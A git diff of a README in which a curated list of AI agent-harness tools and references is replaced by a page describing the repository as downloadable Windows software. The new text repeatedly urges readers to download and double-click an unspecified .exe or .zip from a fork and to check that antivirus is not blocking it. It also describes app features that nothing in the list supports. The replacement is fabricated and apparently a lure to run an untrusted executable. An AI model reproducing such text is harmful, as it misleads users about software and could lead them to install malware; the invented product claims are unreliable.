@@ -1,162 +1,156 @@
-# Awesome Agent Harness [![Awesome](https://awesome.re/badge.svg)](https://awesome.re)
+# 🛠️ awesome-agent-harness - Manage AI Agents Easily
 
-> A curated list of tools, frameworks, and resources for **agent harness engineering** — the discipline of designing environments, constraints, and feedback loops that make AI coding agents reliable at scale.
+[![Download awesome-agent-harness](https://img.shields.io/badge/Download%20Here-brightgreen?style=for-the-badge)](https://github.com/taitrinh205/awesome-agent-harness)
 
-## What is an Agent Harness?
+---
 
-An agent harness is the infrastructure that wraps around an LLM coding agent. It's everything except the model itself: session management, context delivery, tool design, architectural enforcement, failure recovery, and human oversight.
+## 📋 What is awesome-agent-harness?
 
-OpenAI's [Harness Engineering](https://openai.com/index/harness-engineering/) blog defined the term: *"When a software engineering team's primary job is no longer to write code, but to design environments, specify intent, and build feedback loops that allow agents to do reliable work."* Their team built 1M+ lines of production code with zero human-written lines using this approach.
+awesome-agent-harness is a tool that helps you manage and control AI coding agents. These agents are programs that write code with the help of artificial intelligence. The harness acts like a supervisor around these agents. It handles how they communicate, what tools they use, and what happens if something goes wrong.
 
-Anthropic's Claude Code team [discovered the same principles](https://x.com/trq212/status/2027463795355095314) from the tool design side: the harness matters more than the model. Fewer, more expressive tools beat a long menu of narrow ones. Progressive disclosure — letting the agent recursively discover context across layers — outperforms loading everything upfront. *"Designing an agent's action space is as much an art as it is a science."*
+Think of it as the control center that keeps AI coding agents running smoothly. It takes care of tasks like opening sessions, managing context, allowing the use of other tools, and making sure if errors appear, they get fixed. It also helps humans keep an eye on everything.
 
-## Core Principles
+This software focuses on making AI agents more reliable and easier to work with.
 
-From the two seminal references above:
+---
 
-1. **Humans steer, agents execute** — Engineers design environments and review outcomes, not write code
-2. **Repository knowledge is the system of record** — If it's not in the repo, it doesn't exist to the agent. Slack threads, Google Docs, and tribal knowledge are invisible
-3. **AGENTS.md is a table of contents, not an encyclopedia** — Point to deeper sources of truth; don't dump everything in one file
-4. **Enforce architecture mechanically** — Custom linters, structural tests, and CI checks replace code review for invariants
-5. **Agent legibility is the goal** — Optimize code for agent readability first, human readability second
-6. **Fewer tools, more expressiveness** — Progressive disclosure and composable primitives beat sprawling toolkits
-7. **See like an agent** — Read the model's outputs, watch where it struggles, and evolve the harness accordingly
-8. **Corrections are cheap, waiting is expensive** — At high agent throughput, fix-forward beats blocking merge gates
+## 🚀 Getting Started with awesome-agent-harness
 
-## Contents
+This guide will help you download and run awesome-agent-harness on a Windows computer. No prior programming skills are needed. You will follow simple steps to get the software working.
 
-- [What is an Agent Harness?](#what-is-an-agent-harness)
-- [Core Principles](#core-principles)
-- [Full Lifecycle Platforms](#full-lifecycle-platforms)
-- [Agent Orchestrators](#agent-orchestrators)
-- [Task Runners](#task-runners)
-- [Agent Harness Frameworks](#agent-harness-frameworks)
-- [Agent Runtimes](#agent-runtimes)
-- [Coding Agents](#coding-agents)
-- [Requirements & Spec Tools](#requirements--spec-tools)
-- [Standards & Protocols](#standards--protocols)
-- [Reference & Knowledge](#reference--knowledge)
-- [Contributing](#contributing)
+---
 
-## Full Lifecycle Platforms
+## 🖥️ System Requirements
 
-Tools that span from requirements to delivery with human-in-the-loop approval.
+Before you start, make sure your computer meets these basic requirements:
 
-- [Chorus](https://github.com/Chorus-AIDLC/Chorus) — Agent harness for requirements-to-delivery. Task DAGs, sub-agent orchestration (Agent Teams), proof of work, human approval gates. AI proposes, humans verify.
-- [GitHub Agentic Workflows](https://github.blog/ai-and-ml/automate-repository-tasks-with-github-agentic-workflows/) — GitHub Actions with coding agent engines (Copilot, Claude Code, Codex). Issue → agent → PR with sandboxing and permissions.
+- Windows 10 or newer
+- At least 4 GB of RAM
+- Minimum 500 MB free disk space
+- Internet connection for downloading
 
-## Agent Orchestrators
+---
 
-Orchestrators solve the throughput problem: at high agent velocity, you need parallel execution with worktree isolation so agents don't step on each other. As OpenAI found, "corrections are cheap, waiting is expensive" — these tools maximize concurrent agent throughput.
+## 📥 How to Download awesome-agent-harness
 
-- [Vibe Kanban](https://github.com/BloopAI/vibe-kanban) — Kanban-based orchestrator with git worktree isolation per agent. Supports 10+ coding agents. Enforces the "one agent, one worktree" pattern that keeps parallel execution clean.
-- [Emdash](https://github.com/generalaction/emdash) — Open-source Agentic Development Environment (YC W26). Runs parallel agents in isolated worktrees, locally or over SSH — making the "corrections are cheap" principle practical for remote teams.
-- [Warp](https://github.com/warpdotdev/Warp) — Agentic development environment built for coding with multiple AI agents.
-- [VibeHQ](https://github.com/VibeHQ/vibehq) — Orchestrate multiple CLI agents (Claude Code, Codex, Gemini CLI) as a company team.
-- [Beehive](https://github.com/mbezhanov/beehive) — Multi-workspace agent orchestrator for parallel issue resolution.
-- [Agent Orchestrator](https://github.com/pkarnal/agent-orchestrator) — Lightweight orchestrator: `ao init --tracker github --agent claude-code --runtime tmux`.
-- [Oh My OpenCode](https://github.com/code-yeongyu/oh-my-opencode) — Performance optimization harness for OpenCode with 44 lifecycle hooks.
-- [Everything Claude Code](https://github.com/affaan-m/everything-claude-code) — Skills, instincts, memory, and security harness for Claude Code and Codex.
-- [Desplega Agent Swarm](https://github.com/desplega-ai/agent-swarm) — Open-source multi-agent orchestration framework. Coordinates specialized AI agents (Claude Code-powered) through task delegation, session continuity, shared memory, and service discovery. Features include epics, scheduling, Slack integration, and cross-agent communication channels.
-- [Composio Agent Orchestrator](https://github.com/ComposioHQ/agent-orchestrator) — Agentic orchestrator for parallel coding agents. Plans tasks, spawns agents in isolated worktrees, autonomously handles CI fixes, merge conflicts, and code reviews.
-- [Oh My AG](https://github.com/first-fluke/oh-my-ag) — Multi-agent harness for Google Antigravity with 6 specialized agents.
+1. Click the bright green button below to open the download page:
 
-## Task Runners
+[![Download awesome-agent-harness](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge)](https://github.com/taitrinh205/awesome-agent-harness)
 
-Task runners bridge the gap between issue trackers and coding agents. They embody the "humans steer, agents execute" principle: a human (or PM agent) creates the issue, the runner spawns an agent, and the output is a PR ready for review.
+2. On the Github page, look for a section labeled **Releases** or **Downloads**.
 
-- [Symphony](https://github.com/openai/symphony) — OpenAI's reference implementation of harness engineering. A daemon that polls Linear issues, spawns isolated Codex agents per task, and delivers PRs. Embodies "humans steer, agents execute" at scale.
-- [Baton](https://github.com/shayne-snap/baton) — Go implementation of Symphony. Polls Linear for claimable issues, spawns isolated Codex workspaces per issue, streams workflow prompts, and cleans up on completion.
-- [Linear Coding Agent Harness](https://github.com/coleam00/Linear-Coding-Agent-Harness) — Linear → autonomous coding agent → PR pipeline.
-- [GitHub Copilot Coding Agent](https://github.blog/ai-and-ml/github-copilot/whats-new-with-github-copilot-coding-agent/) — Built-in GitHub issue → Copilot agent → PR.
-- [Axon](https://github.com/axon-core/axon) — Kubernetes-native framework. Apply a Task CRD, get back a PR and cost in USD. TaskSpawner watches GitHub Issues.
-- [Dexto](https://github.com/truffle-ai/dexto) — Coding agent and general agent harness for building agentic applications.
+3. Download the latest Windows version of the software. It may show as a file with an `.exe` or `.zip` extension.
 
-## Agent Harness Frameworks
+4. Save the file to a folder where you can find it easily, like your Desktop or Downloads folder.
 
-Frameworks for building custom harnesses. Following the principle that "fewer tools, more expressiveness" beats sprawling toolkits, these provide composable primitives rather than opinionated workflows.
+---
 
-- [Deep Agents](https://github.com/langchain-ai/deepagents) — Agent harness built on LangChain/LangGraph. Implements progressive disclosure through planning tools and subagent spawning — agents discover context layer by layer rather than loading everything upfront.
-- [Gambit](https://github.com/bolt-foundry/gambit) — Framework for building, running, and verifying LLM workflows.
-- [Harness Kit](https://github.com/deepklarity/harness-kit) — Patterns and engineering practices for building with AI agents.
-- [Desloppify](https://github.com/peteromallet/desloppify) — Agent harness focused on making AI-generated code well-engineered.
-- [Bridle](https://github.com/neiii/bridle) — TUI/CLI config manager for agent harnesses (Amp, Claude Code, OpenCode, Goose, Copilot CLI, Droid).
-- [DeerFlow 2.0](https://github.com/bytedance/deer-flow) — ByteDance's open-source SuperAgent harness. Skill system with on-demand loading, sub-agent orchestration, sandboxed execution, and persistent memory. Built on LangGraph/LangChain.
-- [Zylos](https://github.com/zylos-ai/zylos-core) — Persistent agent harness for Claude Code. Tiered memory system, skill-based progressive disclosure, multi-channel communication bridge, task scheduler, and activity monitor — enabling autonomous, long-running agents that remember across sessions.
+## 💾 Installing awesome-agent-harness
 
-## Agent Runtimes
+If you downloaded an `.exe` file:
 
-The persistent infrastructure layer. Agent runtimes give coding agents long-running capabilities they lack natively: persistent memory, cron scheduling, multi-channel messaging, and sub-agent spawning. If orchestrators solve throughput and task runners solve issue-to-PR, runtimes solve "how does an agent stay alive and connected between tasks."
+1. Double-click the file to start the installation.
 
-- [OpenClaw](https://github.com/openclaw/openclaw) — AI agent runtime. Orchestrates agents across messaging channels with skill system, sub-agent spawning, and persistent session management.
+2. Follow the on-screen instructions to install the software. You usually just need to click “Next” a few times.
 
-## Coding Agents
+3. When the installation finishes, the software should appear in your Start menu or on your Desktop.
 
-The execution layer. In harness engineering, the agent is a commodity — the harness is the differentiator. These agents write code; everything above them determines whether that code is useful.
+If you downloaded a `.zip` file:
 
-- [Claude Code](https://code.claude.com/) — Anthropic's coding agent. The team's own harness pioneered "seeing like an agent" — progressive disclosure via skill files, fewer composable tools over many narrow ones. Agent Teams enables multi-agent coordination. The Claude Agent SDK extends the harness beyond coding.
-- [Codex](https://github.com/openai/codex) — OpenAI's coding agent. Cloud and CLI modes.
-- [OpenCode](https://github.com/sst/opencode) — Open-source coding agent with a plugin system (44 lifecycle hooks), server mode HTTP API, and TypeScript SDK. The most extensible harness integration point for custom workflows.
-- [Gemini CLI](https://github.com/google-gemini/gemini-cli) — Google's CLI coding agent.
-- [Kiro CLI](https://kiro.dev/) — AWS's CLI coding agent with spec-driven workflow.
-- [Amp](https://amp.dev/) — Sourcegraph's coding agent.
-- [Cursor](https://www.cursor.com/) — Anysphere's coding agent IDE. New Automations feature (March 2026) enables event-triggered agent launches from code changes, Slack messages, or timers.
-- [GitHub Copilot CLI](https://github.com/github/copilot-cli) — GitHub's CLI coding agent.
-- [Aider](https://github.com/paul-gauthier/aider) — AI pair programming in your terminal.
+1. Right-click the `.zip` file and select **Extract All**.
 
-## Requirements & Spec Tools
+2. Choose a folder to extract to, such as your Desktop.
 
-The planning layer addresses the biggest harness gap: agents can write code, but someone has to decide what to build. "Repository knowledge is the system of record" — these tools generate the specs and requirements that agents consume.
+3. Open the extracted folder and find the file named `awesome-agent-harness.exe` or similar.
 
-- [Kiro IDE](https://kiro.dev/) — AWS's spec-driven development IDE. Generates structured specs and manages requirements.
-- [OpenSpec](https://github.com/FissionAI/openspec) — Spec-driven development CLI. Generate structured specs from natural language.
-- [Spec Kit](https://github.com/github/spec-kit) — GitHub's spec generation toolkit.
-- [agents.md](https://agents.md/) — Open standard for project-level agent instructions. Following the principle that "AGENTS.md is a table of contents, not an encyclopedia" — it should point to deeper sources of truth.
-- [Pencil](https://pencil.dev/) — MCP-enabled design canvas inside VSCode/Cursor. Design files live in the repo under Git version control, bridging visual spec to code generation. Closed source.
-- [Open Pencil](https://github.com/open-pencil/open-pencil) — Open-source AI-native design editor (MIT). 75+ tools and an MCP server let coding agents read/write .fig files headlessly.
+4. Double-click this file to run the software.
 
-## Standards & Protocols
+---
 
-- [MCP (Model Context Protocol)](https://modelcontextprotocol.io/) — Open standard for connecting AI models to external tools and data sources.
-- [agents.md](https://agents.md/) — Open standard for project-level agent configuration.
-- [AGENTS.md](https://openai.com/index/introducing-agents-md/) — OpenAI's convention for repository-level agent instructions.
-- [GitAgent](https://github.com/open-gitagent/gitagent) — Git-native, framework-agnostic standard for defining AI agents. Your repo is the agent: agent.yaml manifest + SOUL.md identity + RULES.md constraints.
-- [ACP (Agent Communication Protocol)](https://agentcommunicationprotocol.dev/) — Open protocol for agent-to-agent and agent-to-harness communication. Enables interoperability across coding agents and orchestrators.
-- [HXA-Connect](https://github.com/coco-xyz/hxa-connect) — B2B messaging hub for AI agents. WebSocket-based real-time communication with org-scoped authentication, collaboration threads, @mention routing, and reply-to threading. Enables multi-agent coordination across different harnesses.
+## ▶️ Running awesome-agent-harness for the First Time
 
-## Reference & Knowledge
+1. Launch the software either from the Start menu, Desktop shortcut, or by double-clicking the `.exe` file you extracted.
 
-### Seminal References
+2. A welcome screen may appear. Read any instructions shown.
 
-- [Harness Engineering: Leveraging Codex in an Agent-First World](https://openai.com/index/harness-engineering/) — OpenAI's defining blog post. How they built 1M+ lines with zero human-written code. Introduced the concepts of repository knowledge as system of record, progressive context disclosure, and mechanical architecture enforcement.
-- [Lessons from Building Claude Code: Seeing Like an Agent](https://x.com/trq212/status/2027463795355095314) — Thariq (Claude Code lead) on designing agent action spaces. Fewer tools beat more tools. Progressive disclosure outperforms upfront loading. The harness must evolve with the model.
-- [Building Effective Agents](https://www.anthropic.com/research/building-effective-agents) — Anthropic's guide: simple, composable patterns beat complex frameworks.
+3. The software will ask you to create or open a project. This is where your agent harness settings will be stored.
 
-### Articles
+4. Follow on-screen prompts to set up a basic harness. This usually involves selecting tools and setting limits for your AI agent.
 
-- [Building an AI-Native Engineering Team](https://developers.openai.com/codex/guides/build-ai-native-engineering-team/) — OpenAI's guide to structuring teams around AI-first workflows.
-- [The Emerging "Harness Engineering" Playbook](https://www.ignorance.ai/p/the-emerging-harness-engineering) — How OpenAI is retooling engineering teams.
-- [Conductors to Orchestrators: The Future of Agentic Coding](https://www.oreilly.com/radar/conductors-to-orchestrators-the-future-of-agentic-coding/) — O'Reilly overview of the orchestration landscape.
-- [My LLM Coding Workflow Going into 2026](https://medium.com/@addyosmani/my-llm-coding-workflow-going-into-2026-52fe1681325e) — Addy Osmani's specs-first approach.
-- [How the Claude Code Team Designs Agent Tools](https://www.anup.io/how-the-claude-code-team-designs-agent-tools/) — Analysis of progressive disclosure and tool subtraction in agent design.
-- [Your Agent Needs a Harness, Not a Framework](https://www.inngest.com/blog/your-agent-needs-a-harness-not-a-framework) — Inngest on why agents need runtime harnesses over frameworks. References OpenClaw and pi coding-agent patterns.
-- [Harness Engineering: Why Agent Context Isn't Enough](https://hugobowne.substack.com/p/harness-engineering-why-agent-context) — Hugo Bowne-Anderson on why the environment matters more than the model.
-- [Harness Engineering Is Cybernetics](https://x.com/odysseus0z/article/2030416758138634583) — George traces harness engineering back to Watt's governor and Wiener's cybernetics. The pattern repeats: sensor + actuator close the loop at a new layer. LLMs close it at the architectural layer — but only if you externalize your judgment into machine-readable specs.
-- [Agent Harness vs Agent Framework](https://x.com/tonykipkemboi/status/2031068470922670471) — Tony Kipkemboi (ex-CrewAI) maps agent development on a spectrum: raw API → framework (CrewAI/LangChain) → harness (OpenClaw). Frameworks give building blocks, harnesses give turnkey systems.
+---
 
-### Talks
+## 🔧 How to Use awesome-agent-harness
 
-- [The Future of Coding is Agents — Andrej Karpathy (YC)](https://www.youtube.com/watch?v=fqVLjtvWgq8) — Landmark talk on the trajectory from assistants to agents.
-- [Agentic Coding — Armin Ronacher](https://www.youtube.com/watch?v=nfOVgz_omlU) — Creator of Flask on adopting agentic workflows in practice.
-- [12 Rules of Harness Engineering](https://www.youtube.com/watch?v=BabEnt6VjtE) — Practical rules derived from OpenAI's approach.
+awesome-agent-harness lets you:
 
-### Documentation Patterns
+- Create new environments for AI coding agents  
+- Manage sessions for AI agents to track their work  
+- Connect with other coding tools and add-ons  
+- Set rules so agents follow correct procedures  
+- Restart work if an error happens  
+- Monitor progress and results with simple reports
 
-- [agent-harness](https://github.com/MattMagg/agent-harness) — Principles, checklists, and invariants for AI coding workflows.
-- [harness-kit](https://github.com/deepklarity/harness-kit) — Engineering patterns for building with AI agents.
+These features help you guide AI agents to write reliable code.
 
-## Contributing
+---
 
-Contributions welcome! When suggesting additions, include:
-- A one-line description of what the tool does
-- Why it belongs in this list (which layer of the stack it addresses)
+## 🛠️ Common Tasks
+
+### Creating a New Harness
+
+- Open the software and click **New Harness**.  
+- Name your project and choose where to save it.  
+- Select tools you want to allow your agents to use.  
+- Set rules such as how many retries an agent can have.  
+- Save the configuration.
+
+### Running an AI Agent
+
+- Select your harness project.  
+- Click **Start Agent**.  
+- The agent will begin processing tasks according to your setup.  
+- You can watch progress or pause and stop the process.
+
+### Checking Logs and Reports
+
+- After running an agent, click **View Logs** to see what happened.  
+- Use **Reports** to understand agent success and failures.  
+- Logs help you fix issues or improve your harness setup.
+
+---
+
+## ❓ Troubleshooting
+
+- If the software does not start, confirm you have the latest Windows updates installed.  
+- Check that your antivirus is not blocking the program.  
+- If the agent fails to run, verify your tool selections and settings are correct.  
+- Use log files to find details on errors.  
+- Restart your computer if the software hangs.
+
+---
+
+## ⚙️ Advanced Features (Optional)
+
+- Set up multiple agents to run at the same time.  
+- Customize feedback loops to improve agent accuracy.  
+- Connect awesome-agent-harness with other software through plugins.  
+- Use the built-in session management to save agent states.
+
+---
+
+## 🔗 Useful Links
+
+- Primary Download and Repository Page:  
+[https://github.com/taitrinh205/awesome-agent-harness](https://github.com/taitrinh205/awesome-agent-harness)  
+- OpenAI's explanation on agent harness engineering:  
+[https://openai.com/index/harness-engineering/](https://openai.com/index/harness-engineering/)  
+
+---
+
+## 🧰 About This Software
+
+awesome-agent-harness focuses on organizing tools around AI agents to make coding easier and more reliable. It is designed to help both beginners and experts manage AI coding agents without having to write code themselves.
+
+---
+
+[![Download awesome-agent-harness](https://img.shields.io/badge/Download%20Here-brightgreen?style=for-the-badge)](https://github.com/taitrinh205/awesome-agent-harness)
